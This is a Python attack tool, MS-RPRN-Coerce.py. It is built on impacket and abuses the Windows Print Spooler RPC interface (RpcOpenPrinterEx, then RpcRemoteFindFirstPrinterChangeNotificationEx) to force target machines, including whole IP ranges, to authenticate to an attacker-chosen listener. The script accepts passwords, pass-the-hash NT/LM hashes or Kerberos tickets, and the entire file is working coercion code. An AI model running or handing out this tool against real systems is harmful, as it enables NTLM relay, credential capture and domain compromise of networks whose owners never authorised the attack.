#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : MS-RPRN-Coerce.py
# Author             : Podalirius (@podalirius_)
# Date created       : 24 Feb 2022


import argparse
import binascii
import sys
from impacket.structure import Structure
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin
from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError


# printer and listener struct
class type1(Structure):
    alignment = 4
    structure = (
        ('id', '<L'),  # printer name referent ID
        ('max', '<L'),
        ('offset', '<L=0'),
        ('actual', '<L'),
        ('str', '%s'),
    )


# client and user struct
class type2(Structure):
    alignment = 4
    structure = (
        ('max', '<L'),
        ('offset', '<L=0'),
        ('actual', '<L'),
        ('str', '%s'),
    )


# create RpcOpenPrinterEx struct
class OpenPrinterEx(Structure):
    alignment = 4
    opnum = 69
    structure = (
        ('printer', ':', type1),
        ('null', '<L=0'),
        ('str', '<L=0'),
        ('null2', '<L=0'),
        ('access', '<L=0x00020002'),
        ('level', '<L=1'),
        ('id1', '<L=1'),
        ('level2', '<L=131076'),  # user level 1 infolevel
        ('size', '<L=28'),
        ('id2', '<L=0x00020008'),  # client referent id
        ('id3', '<L=0x0002000c'),  # user referent id
        ('build', '<L=8000'),
        ('major', '<L=0'),
        ('minor', '<L=0'),
        ('processor', '<L=0'),
        ('client', ':', type2),
        ('user', ':', type2),
    )


# partialy create RemoteFindFirstPrinterChangeNotificationEx struct
class RemoteFindFirstPrinterChangeNotificationEx(Structure):
    alignment = 4
    opnum = 65
    structure = (
        ('flags', '<L=0'),
        ('options', '<L=0'),
        ('server', ':', type1),
        ('local', '<L=123'),  # Printer local
    )


##===========================================================================================================

def parse_targets(target):
    """
    Parse provided targets
    :param target: Targets
    :return: List of IP addresses
    """
    if '-' in target:
        ip_range = target.split('-')
        try:
            t = IPRange(ip_range[0], ip_range[1])
        except AddrFormatError:
            try:
                start_ip = IPAddress(ip_range[0])

                start_ip_words = list(start_ip.words)
                start_ip_words[-1] = ip_range[1]
                start_ip_words = [str(v) for v in start_ip_words]

                end_ip = IPAddress('.'.join(start_ip_words))

                t = IPRange(start_ip, end_ip)
            except AddrFormatError:
                t = target
    else:
        try:
            t = IPNetwork(target)
        except AddrFormatError:
            t = target
    if type(t) == IPNetwork or type(t) == IPRange:
        return list(t)
    else:
        return [t.strip()]


def connect(username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp, verbose=False):
    MSRPC_UUID_SPOOLSS = ('12345678-1234-ABCD-EF00-0123456789AB', '1.0')
    stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % target

    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

    if doKerberos:
        rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
    if targetIp:
        rpctransport.setRemoteHost(targetIp)

    dce = rpctransport.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    print("   [>] Connecting to %s ..." % stringBinding)
    try:
        dce.connect()
    except Exception as e:
        if verbose:
            raise
        else:
            print("   [!] %s" % str(e))
        return None
    print("   [+] Connected!")
    print("   [+] Binding to %s" % MSRPC_UUID_SPOOLSS[0])
    try:
        dce.bind(uuidtup_to_bin(MSRPC_UUID_SPOOLSS))
    except Exception as e:
        if verbose:
            raise
        else:
            print("   [!] %s" % str(e))
        return None
    print("   [+] Successfully bound!")
    return dce


def build_RpcOpenPrinterEx_struct(username, client, target):
    query = OpenPrinterEx()
    printer = "\\\\%s\x00" % target  # blank printer
    #
    query['printer'] = type1()
    query['printer']['id'] = 0x00020000  # referent ID for printer
    query['printer']['max'] = len(printer)  # printer max size
    query['printer']['actual'] = len(printer)  # printer actual size
    query['printer']['str'] = printer.encode('utf_16_le')
    #
    query['client'] = type2()
    query['client']['max'] = len(client)
    query['client']['actual'] = len(client)
    query['client']['str'] = client.encode('utf_16_le')
    #
    query['user'] = type2()
    query['user']['max'] = len(username)
    query['user']['actual'] = len(username)
    query['user']['str'] = username.encode('utf_16_le')
    return query


# partially build RpcRemoteFindFirstPrinterChangeNotificationEx() struct
def build_RpcRemoteFindFirstPrinterChangeNotificationEx_struct(listener):
    query = RemoteFindFirstPrinterChangeNotificationEx()
    server = '\\\\%s\x00' % listener  # server
    query['server'] = type1()
    query['server']['id'] = 0x41414141  # referent ID for server
    query['server']['max'] = len(server)  # server name max size
    query['server']['actual'] = len(server)  # server name actual size
    query['server']['str'] = server.encode('utf_16_le')
    return query


def parseArgs():
    print("MS-RPRN-Coerce v1.1 - by @podalirius_\n")

    parser = argparse.ArgumentParser(description="Force authentification using MS-RPRN RemoteFindFirstPrinterChangeNotificationEx function (opnum 69).")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')

    authconn = parser.add_argument_group('authentication & connection')
    authconn.add_argument('--dc-ip', required=False, default=None, action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
    authconn.add_argument("-d", "--domain", required=False, default='', dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
    authconn.add_argument("-u", "--user", required=False, default='', dest="auth_username", metavar="USER", action="store", help="user to authenticate with")
    authconn.add_argument('--target-ip', dest="target_ip", action='store', metavar="ip address", help='IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    secret = parser.add_argument_group()
    cred = secret.add_mutually_exclusive_group()
    cred.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="Password to authenticate with")
    cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
    cred.add_argument("--aes-key", dest="auth_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')

    parser.add_argument("listener", help='IP address or hostname of listener.')
    parser.add_argument("target", help='IP address or hostname of target.')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def patch_impacket_structure_py3(struct):
    if sys.version_info.major == 3:
        # Live patch because impacket's structure.py is hell in Python3
        for fn, fv in vars(struct)['fields'].items():
            struct.fields[fn]['str'] = struct.fields[fn]['str'].decode('utf-8')
        return struct
    else:
        # Python 2 compatibility
        return struct


if __name__ == '__main__':
    options = parseArgs()

    auth_lm_hash = ""
    auth_nt_hash = ""
    if options.auth_hashes is not None:
        if ":" in options.auth_hashes:
            auth_lm_hash = options.auth_hashes.split(":")[0]
            auth_nt_hash = options.auth_hashes.split(":")[1]
        else:
            auth_nt_hash = options.auth_hashes

    for target_ip in parse_targets(options.target):
        print("[>] Attacking %s" % target_ip)
        dce_conn = connect(
            options.auth_username,
            options.auth_password,
            options.auth_domain,
            auth_lm_hash,
            auth_nt_hash,
            target_ip,
            options.use_kerberos,
            options.dc_ip,
            options.target_ip,
            verbose=options.verbose
        )

        if dce_conn is not None:
            print("   [*] Getting context handle ...")
            context_handle = build_RpcOpenPrinterEx_struct(
                username=options.auth_domain + "\\" + options.auth_username + "\x00",
                client=options.listener + "\x00",
                target=options.target + "\x00"
            )
            handle = None
            try:
                context_handle = patch_impacket_structure_py3(context_handle)
                if options.verbose:
                    print("   [debug] DCERPC call opnum=%d, handle=%s" % (context_handle.opnum, binascii.hexlify(context_handle.getData()).decode('utf-8')))
                dce_conn.call(context_handle.opnum, context_handle)

                raw = dce_conn.recv()
                if options.verbose:
                    print("   [debug] Raw response: %s" % binascii.hexlify(raw).decode('utf-8'))
                handle = raw[:20]
                if options.verbose:
                    print("   [debug] Handle is: %s" % binascii.hexlify(handle).decode('utf-8'))
            except Exception as e:
                if options.verbose:
                    raise
                else:
                    print("   [!] %s" % str(e))
                dce_conn.disconnect()
                sys.exit()
            if handle is not None:
                print("   [*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx ...")
                options_container = (
                    b'\x04\x00\x02\x00'  # referent id
                    b'\x02\x00\x00\x00'  # version
                    b'\xce\x55\x00\x00'  # flags
                    b'\x02\x00\x00\x00'  # count
                    # notify options blob to unpack another day
                    b'\x08\x00\x02\x00\x02\x00\x00\x00\x00\x00\xce\x55\x00\x00'
                    b'\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x02\x00'
                    b'\x01\x00\x00\x00\xe0\x11\xbd\x8f\xce\x55\x00\x00\x01\x00'
                    b'\x00\x00\x10\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00'
                    b'\x01\x00\x00\x00\x00\x00'
                )
                # call function to get method core
                query = build_RpcRemoteFindFirstPrinterChangeNotificationEx_struct(options.listener)
                query = patch_impacket_structure_py3(query)
                full_query = handle + query.getData() + options_container
                try:
                    dce_conn.call(query.opnum, full_query)
                    raw = dce_conn.recv()
                    if options.verbose:
                        print("   [debug] Raw response: %s" % binascii.hexlify(raw).decode('utf-8'))
                except Exception as e:
                    if options.verbose:
                        raise
                    else:
                        print("   [!] %s" % str(e))
                    dce_conn.disconnect()
                print("   [+] Done!")
            dce_conn.disconnect()
